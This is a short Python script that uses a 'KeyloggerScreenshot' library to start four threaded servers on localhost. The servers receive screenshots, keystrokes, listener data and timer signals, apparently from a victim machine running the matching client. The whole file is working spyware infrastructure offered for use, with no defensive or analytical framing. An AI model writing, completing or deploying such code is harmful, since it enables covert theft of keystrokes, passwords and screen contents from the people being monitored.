import KeyloggerScreenshot as ks
import threading

ip = "127.0.0.1"

server_photos = ks.ServerPhotos(ip, 1122)

server_keylogger = ks.ServerKeylogger(ip, 2233, simulater=True)

server_listener = ks.ServerListener(ip, 1134)

server_time = ks.Timer(ip, 4455)

threading_server = threading.Thread(target=server_photos.start)
threading_server.start()

threading_server2 = threading.Thread(target=server_keylogger.start)
threading_server2.start()

threading_server3 = threading.Thread(target=server_listener.start)
threading_server3.start()

threading_server4 = threading.Thread(target=server_time.start_timer)
threading_server4.start() 
